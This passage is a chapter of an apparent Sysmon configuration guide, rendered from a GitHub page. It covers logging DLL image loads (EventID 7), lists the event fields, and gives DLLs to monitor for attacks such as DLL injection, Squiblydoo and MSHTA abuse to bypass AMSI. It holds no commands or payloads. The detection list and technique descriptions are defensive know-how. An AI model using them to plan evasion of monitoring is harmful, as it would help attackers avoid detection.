LatestCommit-module__Box_2__pSPKJ"><div class="Truncate flex-items-center f5"><span class="Text__StyledText-sc-1klmep6-0 Truncate-text prc-Text-Text-9mHv3" data-testid="latest-commit-html"><a data-hovercard-url="/trustedsec/SysmonCommunityGuide/commit/bde5de34c30521837013b586d8de17677722fa90/hovercard" data-pjax="true" class="Link--secondary" href="https://github.com/trustedsec/SysmonCommunityGuide/commit/bde5de34c30521837013b586d8de17677722fa90" aria-keyshortcuts="Alt+ArrowUp">update to build and chapters</a></span></div><button data-component="IconButton" type="button" aria-pressed="false" aria-expanded="false" data-testid="latest-commit-details-toggle" class="prc-Button-ButtonBase-9n-Xk LatestCommit-module__IconButton__mkJr_ prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="small" data-variant="invisible" aria-labelledby="_r_6t_"><svg aria-hidden="true" focusable="false" class="octicon octicon-ellipsis" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align: text-bottom;"><path d="M0 5.75C0 4.784.784 4 1.75 4h12.5c.966 0 1.75.784 1.75 1.75v4.5A1.75 1.75 0 0 1 14.25 12H1.75A1.75 1.75 0 0 1 0 10.25ZM12 7a1 1 0 1 0 0 2 1 1 0 0 0 0-2ZM7 8a1 1 0 1 0 2 0 1 1 0 0 0-2 0ZM4 7a1 1 0 1 0 0 2 1 1 0 0 0 0-2Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="s" aria-hidden="true" id="_r_6t_" popover="auto">Open commit details</span></div><span class="d-flex d-sm-none fgColor-muted f6"><relative-time tense="past" datetime="2025-11-30T17:36:08.000Z" title="Nov 30, 2025, 12:36 PM EST">4 months agoNov 30, 2025</relative-time></span></div><div class="d-flex flex-shrink-0 gap-2"><div data-testid="latest-commit-details" class="d-none d-sm-flex flex-items-center"><span class="d-flex flex-nowrap fgColor-muted f6"><a class="Link--secondary prc-Link-Link-9ZwDx" aria-label="Commit bde5de3" data-hovercard-url="/trustedsec/SysmonCommunityGuide/commit/bde5de34c30521837013b586d8de17677722fa90/hovercard" data-hovercard-type="commit" octo-click="hovercard-link-click" octo-dimensions="link_type:self" aria-keyshortcuts="Alt+ArrowUp" href="https://github.com/trustedsec/SysmonCommunityGuide/commit/bde5de34c30521837013b586d8de17677722fa90" data-discover="true">bde5de3</a>&nbsp;·&nbsp;<relative-time tense="past" datetime="2025-11-30T17:36:08.000Z" title="Nov 30, 2025, 12:36 PM EST">4 months agoNov 30, 2025</relative-time></span></div><div class="d-flex gap-2"><h2 class="sr-only ScreenReaderHeading-module__userSelectNone__rwWIk prc-Heading-Heading-MtWFE" data-testid="screen-reader-heading">History</h2><a href="https://github.com/trustedsec/SysmonCommunityGuide/commits/master/chapters/image-loading.md" class="prc-Button-ButtonBase-9n-Xk d-none d-lg-flex LinkButton-module__linkButton__nFnov flex-items-center fgColor-default" data-loading="false" data-size="small" data-variant="invisible"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="leadingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg aria-hidden="true" focusable="false" class="octicon octicon-history" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m.427 1.927 1.215 1.215a8.002 8.002 0 1 1-1.6 5.685.75.75 0 1 1 1.493-.154 6.5 6.5 0 1 0 1.18-4.458l1.358 1.358A.25.25 0 0 1 3.896 6H.25A.25.25 0 0 1 0 5.75V2.104a.25.25 0 0 1 .427-.177ZM7.75 4a.75.75 0 0 1 .75.75v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5A.75.75 0 0 1 7.75 4Z"></path></svg></span><span data-component="text" class="prc-Button-Label-FWkx3"><span class="fgColor-default">History</span></span></span></a><div class="d-sm-none"><button data-component="IconButton" type="button" aria-pressed="false" aria-expanded="false" data-testid="latest-commit-details-toggle" class="prc-Button-ButtonBase-9n-Xk LatestCommit-module__IconButton__mkJr_ prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="small" data-variant="invisible" aria-labelledby="_r_6v_"><svg aria-hidden="true" focusable="false" class="octicon octicon-ellipsis" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align: text-bottom;"><path d="M0 5.75C0 4.784.784 4 1.75 4h12.5c.966 0 1.75.784 1.75 1.75v4.5A1.75 1.75 0 0 1 14.25 12H1.75A1.75 1.75 0 0 1 0 10.25ZM12 7a1 1 0 1 0 0 2 1 1 0 0 0 0-2ZM7 8a1 1 0 1 0 2 0 1 1 0 0 0-2 0ZM4 7a1 1 0 1 0 0 2 1 1 0 0 0 0-2Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="s" aria-hidden="true" id="_r_6v_" popover="auto">Open commit details</span></div><div class="d-flex d-lg-none"><a aria-label="View commit history for this file." href="https://github.com/trustedsec/SysmonCommunityGuide/commits/master/chapters/image-loading.md" class="prc-Button-ButtonBase-9n-Xk LinkButton-module__linkButton__nFnov flex-items-center fgColor-default" data-loading="false" data-size="small" data-variant="invisible" aria-describedby="_R_15lalajal1d_"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="leadingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg aria-hidden="true" focusable="false" class="octicon octicon-history" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m.427 1.927 1.215 1.215a8.002 8.002 0 1 1-1.6 5.685.75.75 0 1 1 1.493-.154 6.5 6.5 0 1 0 1.18-4.458l1.358 1.358A.25.25 0 0 1 3.896 6H.25A.25.25 0 0 1 0 5.75V2.104a.25.25 0 0 1 .427-.177ZM7.75 4a.75.75 0 0 1 .75.75v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5A.75.75 0 0 1 7.75 4Z"></path></svg></span></span></a><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="s" role="tooltip" aria-hidden="true" id="_R_15lalajal1d_" popover="auto">History</span></div></div></div></div></div><div class="d-flex flex-row"><div class="container BlobViewContent-module__blobContainer__DtH2d"><div class="react-code-size-details-banner BlobViewContent-module__codeSizeDetails__e5sUw"><div class="react-code-size-details-banner CodeSizeDetails-module__Box__VcD6l"><div class="text-mono CodeSizeDetails-module__Box_1__GVxQL"><div data-testid="blob-size" class="CodeSizeDetails-module__Truncate_1__lE93V prc-Truncate-Truncate-2G1eo" data-inline="true" title="13.9 KB" style="--truncate-max-width:100%"><span>286 lines (210 loc) · 13.9 KB</span></div></div></div></div><div class="react-blob-view-header-sticky BlobViewContent-module__stickyHeader__VwxB5" id="repos-sticky-header"><div class="BlobViewHeader-module__Box__yhm9u"><div class="react-blob-sticky-header"><div class="FileNameStickyHeader-module__outerWrapper__ZL4Xc FileNameStickyHeader-module__outerWrapperHidden__Zpynk"><div class="FileNameStickyHeader-module__Box_5__dmNXA"><div class="Breadcrumb-module__container__Vxvev Breadcrumb-module__md__Wb1Gs"><div data-testid="breadcrumbs-filename" class="Breadcrumb-module__filename__equZR"><span class="Breadcrumb-module__separator__eNwsI Breadcrumb-module__md__Wb1Gs" aria-hidden="true">/</span><h1 class="Breadcrumb-module__filenameHeading__MNMtw Breadcrumb-module__md__Wb1Gs prc-Heading-Heading-MtWFE" tabindex="-1" id="sticky-file-name-id">image-loading.md</h1></div></div><button type="button" class="prc-Button-ButtonBase-9n-Xk FileNameStickyHeader-module__Button__LSEU_ FileNameStickyHeader-module__GoToTopButton__nxAFn" data-loading="false" data-size="small" data-variant="invisible"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="leadingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg aria-hidden="true" focusable="false" class="octicon octicon-arrow-up" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M3.47 7.78a.75.75 0 0 1 0-1.06l4.25-4.25a.75.75 0 0 1 1.06 0l4.25 4.25a.751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018L9 4.81v7.44a.75.75 0 0 1-1.5 0V4.81L4.53 7.78a.75.75 0 0 1-1.06 0Z"></path></svg></span><span data-component="text" class="prc-Button-Label-FWkx3">Top</span></span></button></div></div></div><div class="BlobViewHeader-module__Box_1__VEmuQ"><h2 class="sr-only ScreenReaderHeading-module__userSelectNone__rwWIk prc-Heading-Heading-MtWFE" data-testid="screen-reader-heading">File metadata and controls</h2><div class="BlobViewHeader-module__Box_2__icUs2"><ul aria-label="File view" class="prc-SegmentedControl-SegmentedControl-lqIXp BlobTabButtons-module__SegmentedControl__jen2u" data-variant="default" data-size="small"><li class="prc-SegmentedControl-Item-tSCQh" data-selected=""><button aria-current="true" class="prc-SegmentedControl-Button-E48xz" type="button" style="--separator-color:transparent" data-hotkey="Control+/ Control+p"><span class="prc-SegmentedControl-Content-1COlk segmentedControl-content"><div class="prc-SegmentedControl-Text-7S2y2 segmentedControl-text" data-text="Preview">Preview</div></span></button></li><li class="prc-SegmentedControl-Item-tSCQh"><button aria-current="false" class="prc-SegmentedControl-Button-E48xz" type="button" style="--separator-color:var(--borderColor-default)" data-hotkey="Control+/ Control+c"><span class="prc-SegmentedControl-Content-1COlk segmentedControl-content"><div class="prc-SegmentedControl-Text-7S2y2 segmentedControl-text" data-text="Code">Code</div></span></button></li><li class="prc-SegmentedControl-Item-tSCQh"><button aria-current="false" class="prc-SegmentedControl-Button-E48xz" type="button" style="--separator-color:var(--borderColor-default)" data-hotkey="b,Shift+B,Control+/ Control+b"><span class="prc-SegmentedControl-Content-1COlk segmentedControl-content"><div class="prc-SegmentedControl-Text-7S2y2 segmentedControl-text" data-text="Blame">Blame</div></span></button></li></ul><button data-testid="" data-hotkey-scope="read-only-cursor-text-area" data-hotkey="Control+/ Control+c"></button><button data-testid="" data-hotkey-scope="read-only-cursor-text-area" data-hotkey="b,Shift+B,Control+/ Control+b"></button><button data-testid="" data-hotkey-scope="read-only-cursor-text-area" data-hotkey="Control+/ Control+p"></button><div class="react-code-size-details-in-header CodeSizeDetails-module__Box__VcD6l"><div class="text-mono CodeSizeDetails-module__Box_1__GVxQL"><div data-testid="blob-size" class="CodeSizeDetails-module__Truncate_1__lE93V prc-Truncate-Truncate-2G1eo" data-inline="true" title="13.9 KB" style="--truncate-max-width:100%"><span>286 lines (210 loc) · 13.9 KB</span></div></div></div></div><div class="BlobViewHeader-module__Box_3__ng6v2"><button data-testid="" data-hotkey="Control+Shift+>" data-hotkey-scope="read-only-cursor-text-area"></button><button data-hotkey="Control+Shift+>"></button><button data-testid="" data-hotkey="Control+Shift+<" data-hotkey-scope="read-only-cursor-text-area"></button><button data-hotkey="Control+Shift+<"></button><div class="react-blob-header-edit-and-raw-actions BlobViewHeader-module__Box_4__J4Y4W"><div class="prc-ButtonGroup-ButtonGroup-vFUrY"><div><a href="https://github.com/trustedsec/SysmonCommunityGuide/raw/refs/heads/master/chapters/image-loading.md" data-testid="raw-button" class="prc-Button-ButtonBase-9n-Xk LinkButton-module__linkButton__nFnov BlobViewHeader-module__LinkButton__X9kx2" data-loading="false" data-no-visuals="true" data-size="small" data-variant="default" data-hotkey="Control+/ Control+r"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="text" class="prc-Button-Label-FWkx3">Raw</span></span></a></div><div><button data-component="IconButton" type="button" data-testid="copy-raw-button" class="prc-Button-ButtonBase-9n-Xk prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="small" data-variant="default" aria-labelledby="_R_6arj6alajal1d_" data-hotkey="Control+Shift+C"><svg aria-hidden="true" focusable="false" class="octicon octicon-copy" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="n" aria-hidden="true" id="_R_6arj6alajal1d_" popover="auto">Copy raw file</span></div><div><button data-component="IconButton" type="button" data-testid="download-raw-button" class="prc-Button-ButtonBase-9n-Xk BlobViewHeader-module__downloadButton__ef459 prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="small" data-variant="default" aria-labelledby="_R_3arj6alajal1d_" data-hotkey="Control+Shift+S"><svg aria-hidden="true" focusable="false" class="octicon octicon-download" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 13.25 14Z"></path><path d="M7.25 7.689V2a.75.75 0 0 1 1.5 0v5.689l1.97-1.969a.749.749 0 1 1 1.06 1.06l-3.25 3.25a.749.749 0 0 1-1.06 0L4.22 6.78a.749.749 0 1 1 1.06-1.06l1.97 1.969Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="n" aria-hidden="true" id="_R_3arj6alajal1d_" popover="auto">Download raw file</span></div></div><button data-testid="raw-button-shortcut" data-hotkey-scope="read-only-cursor-text-area" data-hotkey="Control+/ Control+r"></button><button data-testid="copy-raw-button-shortcut" data-hotkey-scope="read-only-cursor-text-area" data-hotkey="Control+Shift+C"></button><button data-testid="download-raw-button-shortcut" data-hotkey-scope="read-only-cursor-text-area" data-hotkey="Control+Shift+S"></button></div><button data-component="IconButton" type="button" aria-pressed="false" class="prc-Button-ButtonBase-9n-Xk pr-mr-2 TableOfContents-module__IconButton__jrlNM prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="small" data-variant="invisible" aria-labelledby="_R_13j6alajal1d_"><svg aria-hidden="true" focusable="false" class="octicon octicon-list-unordered" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M5.75 2.5h8.5a.75.75 0 0 1 0 1.5h-8.5a.75.75 0 0 1 0-1.5Zm0 5h8.5a.75.75 0 0 1 0 1.5h-8.5a.75.75 0 0 1 0-1.5Zm0 5h8.5a.75.75 0 0 1 0 1.5h-8.5a.75.75 0 0 1 0-1.5ZM2 14a1 1 0 1 1 0-2 1 1 0 0 1 0 2Zm1-6a1 1 0 1 1-2 0 1 1 0 0 1 2 0ZM2 4a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="n" aria-hidden="true" id="_R_13j6alajal1d_" popover="auto">Outline</span><div class="react-blob-header-edit-and-raw-actions-combined"><button data-component="IconButton" type="button" title="More file actions" data-testid="more-file-actions-button" aria-haspopup="true" aria-expanded="false" tabindex="0" class="prc-Button-ButtonBase-9n-Xk js-blob-dropdown-click BlobViewHeader-module__IconButton__XrMQY prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="small" data-variant="invisible" aria-labelledby="_R_3t7j6alajal1d_" id="_R_57j6alajal1d_"><svg aria-hidden="true" focusable="false" class="octicon octicon-kebab-horizontal" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="nw" aria-hidden="true" id="_R_3t7j6alajal1d_" popover="auto">Edit and raw actions</span></div></div></div></div><div></div></div><div class="BlobViewContent-module__blobContentWrapper__JS0W6"><section aria-labelledby="file-name-id-wide file-name-id-mobile" class="BlobContent-module__blobContentSection__VOgZq BlobContent-module__blobContentSectionMarkdown__mPLOK" style="margin-top:46px"><div class="Box-sc-62in7e-0 js-snippet-clipboard-copy-unpositioned BlobContent-module__markdownBlob__T8jpG" data-hpc="true"><article class="markdown-body entry-content container-lg" itemprop="text"><div class="markdown-heading" dir="auto"><h1 tabindex="-1" class="heading-element" dir="auto">Image Loading</h1><a id="user-content-image-loading" class="anchor" aria-label="Permalink: Image Loading" href="https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#image-loading"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Sysmon will log <strong>EventID 7</strong> for the loading of images (DLLs, OCX files, and other executable modules) by processes. This is one of the highest-volume event types Sysmon can generate and requires extremely careful configuration. If not properly filtered, image loading can produce millions of events per day and significantly impact system performance.</p>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Understanding the Volume Challenge</h2><a id="user-content-understanding-the-volume-challenge" class="anchor" aria-label="Permalink: Understanding the Volume Challenge" href="https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#understanding-the-volume-challenge"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Every time any process loads a library or module, an image load event is generated. Windows processes routinely load dozens or even hundreds of DLLs during normal operation:</p>
+<ul dir="auto">
+<li>A web browser loading a single webpage might load 50+ DLLs</li>
+<li>Starting Microsoft Office loads hundreds of DLLs</li>
+<li>Windows services continuously load and unload modules</li>
+<li>Security software, frameworks (.NET, Java), and system utilities all load numerous libraries</li>
+</ul>
+<p dir="auto">This makes image loading fundamentally different from other event types. <strong>You cannot use an exclusion-based approach.</strong> Logging all image loads and filtering out noise is not feasible - the volume is simply too high. Instead, image loading requires a <strong>strictly targeted include approach</strong> where you only monitor for specific suspicious DLLs or specific combinations of processes and libraries.</p>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Detection Value and Use Cases</h2><a id="user-content-detection-value-and-use-cases" class="anchor" aria-label="Permalink: Detection Value and Use Cases" href="https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#detection-value-and-use-cases"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Despite the volume challenges, image loading provides critical visibility into sophisticated attack techniques:</p>
+<p dir="auto"><strong>DLL Injection and Process Injection</strong>: Attackers inject malicious code into legitimate processes by loading DLLs into the target process's memory space. Image load events can detect:</p>
+<ul dir="auto">
+<li>Unsigned or suspicious DLLs loaded into sensitive processes</li>
+<li>DLLs loaded from unusual paths (temp directories, user folders)</li>
+<li>Known malicious DLLs identified by hash</li>
+</ul>
+<p dir="auto"><strong>Reflective DLL Loading</strong>: Attackers load DLLs directly into memory without touching disk. While harder to detect, monitoring for the loading of uncommon system DLLs can provide indicators.</p>
+<p dir="auto"><strong>Script Engine Abuse</strong>: Many attacks use Windows scripting engines to execute malicious code. Monitoring for the loading of scripting DLLs helps detect:</p>
+<ul dir="auto">
+<li>PowerShell engine DLLs loaded by non-PowerShell processes</li>
+<li>VBScript or JScript engine DLLs loaded by Office applications (malicious macros)</li>
+<li>Windows Script Host components loaded by unexpected processes</li>
+</ul>
+<p dir="auto"><strong>COM Object Abuse</strong>: Attackers use COM objects and ActiveX controls for execution. Monitoring specific OCX and COM DLLs can detect techniques like:</p>
+<ul dir="auto">
+<li>Regsvr32 loading scrobj.dll (Squiblydoo technique)</li>
+<li>MSHTA loading JavaScript engines to bypass AMSI</li>
+</ul>
+<p dir="auto"><strong>Living Off the Land Detection</strong>: Legitimate Windows binaries executing malicious actions often load specific DLLs that indicate suspicious behavior.</p>
+<p dir="auto"><strong>MITRE ATT&amp;CK Mapping</strong>: Image loading events help detect:</p>
+<ul dir="auto">
+<li><strong>T1055 - Process Injection</strong>: Injecting DLLs into running processes</li>
+<li><strong>T1055.001 - DLL Injection</strong>: Classic DLL injection techniques</li>
+<li><strong>T1129 - Shared Modules</strong>: Loading malicious shared libraries</li>
+<li><strong>T1059.001 - PowerShell</strong>: Detecting PowerShell execution via System.Management.Automation.dll</li>
+<li><strong>T1059.005 - Visual Basic</strong>: Detecting VBScript via vbscript.dll</li>
+<li><strong>T1218.010 - Regsvr32</strong>: Squiblydoo technique via scrobj.dll</li>
+<li><strong>T1218.005 - Mshta</strong>: MSHTA abuse via jscript9.dll loading</li>
+</ul>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Configuration Philosophy: Targeted Includes Only</h2><a id="user-content-configuration-philosophy-targeted-includes-only" class="anchor" aria-label="Permalink: Configuration Philosophy: Targeted Includes Only" href="https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#configuration-philosophy-targeted-includes-only"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Because of the extreme volume, image loading must be configured with <strong>targeted includes only</strong>. You specify exactly which DLLs to monitor or which process and DLL combinations indicate malicious activity. This approach keeps event volume manageable while maintaining detection capability for high-value indicators.</p>
+<p dir="auto"><strong>Never attempt to:</strong></p>
+<ul dir="auto">
+<li>Log all image loads and exclude noise</li>
+<li>Monitor all DLLs loaded by specific processes</li>
+<li>Use broad wildcards or patterns</li>
+</ul>
+<p dir="auto"><strong>Always:</strong></p>
+<ul dir="auto">
+<li>Monitor specific suspicious DLLs known to indicate attacks</li>
+<li>Combine process and DLL criteria (e.g., only log PowerShell DLL when loaded by non-PowerShell processes)</li>
+<li>Start with a minimal configuration and expand carefully based on detection gaps</li>
+</ul>
+<p dir="auto">The event fields are:</p>
+<ul dir="auto">
+<li>
+<p dir="auto"><strong>RuleName</strong>: Name of rule that triggered the event.</p>
+</li>
+<li>
+<p dir="auto"><strong>UtcTime</strong>: Time in UTC when event was created</p>
+</li>
+<li>
+<p dir="auto"><strong>ProcessGuid</strong>: Process Guid of the process that loaded the image</p>
+</li>
+<li>
+<p dir="auto"><strong>ProcessId</strong>: Process ID used by the OS to identify the process
+that loaded the image</p>
+</li>
+<li>
+<p dir="auto"><strong>Image</strong>: File path of the process that loaded the image</p>
+</li>
+<li>
+<p dir="auto"><strong>ImageLoaded</strong>: Path of the image loaded</p>
+</li>
+<li>
+<p dir="auto"><strong>FileVersion</strong>: Version of the image loaded</p>
+</li>
+<li>
+<p dir="auto"><strong>Description</strong>: Description of the image loaded</p>
+</li>
+<li>
+<p dir="auto"><strong>Product</strong>: Product name the image loaded belongs to</p>
+</li>
+<li>
+<p dir="auto"><strong>Company</strong>: Company name the image loaded belongs to</p>
+</li>
+<li>
+<p dir="auto"><strong>OriginalFileName</strong>: OriginalFileName from the PE header, added on
+compilation</p>
+</li>
+<li>
+<p dir="auto"><strong>Hashes</strong>: Full hash of the file with the algorithms in the
+HashType field</p>
+</li>
+<li>
+<p dir="auto"><strong>Signed</strong>: State whether the image loaded is signed</p>
+</li>
+<li>
+<p dir="auto"><strong>Signature</strong>: The signer name</p>
+</li>
+<li>
+<p dir="auto"><strong>SignatureStatus</strong>: status of the signature</p>
+</li>
+</ul>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">High-Value DLLs to Monitor</h2><a id="user-content-high-value-dlls-to-monitor" class="anchor" aria-label="Permalink: High-Value DLLs to Monitor" href="https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#high-value-dlls-to-monitor"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Based on common attack techniques, these DLLs provide the best signal-to-noise ratio:</p>
+<p dir="auto"><strong>Scripting and Execution Engines:</strong></p>
+<ul dir="auto">
+<li><strong>System.Management.Automation.dll</strong> and <strong>System.Management.Automation.ni.dll</strong> - PowerShell engine (detect PowerShell loaded by non-PowerShell processes)</li>
+<li><strong>vbscript.dll</strong> - VBScript engine (common in malicious macros and scripts)</li>
+<li><strong>jscript.dll</strong> and <strong>jscript9.dll</strong> - JavaScript engines (used in MSHTA and script-based attacks)</li>
+<li><strong>scrrun.dll</strong> - Windows Script Runtime (file system and registry access from scripts)</li>
+<li><strong>wshom.ocx</strong> - Windows Script Host Object Model (used by malicious scripts)</li>
+</ul>
+<p dir="auto"><strong>COM and ActiveX Abuse:</strong></p>
+<ul dir="auto">
+<li><strong>scrobj.dll</strong> - Script Component Runtime (Squiblydoo/Regsvr32 abuse)</li>
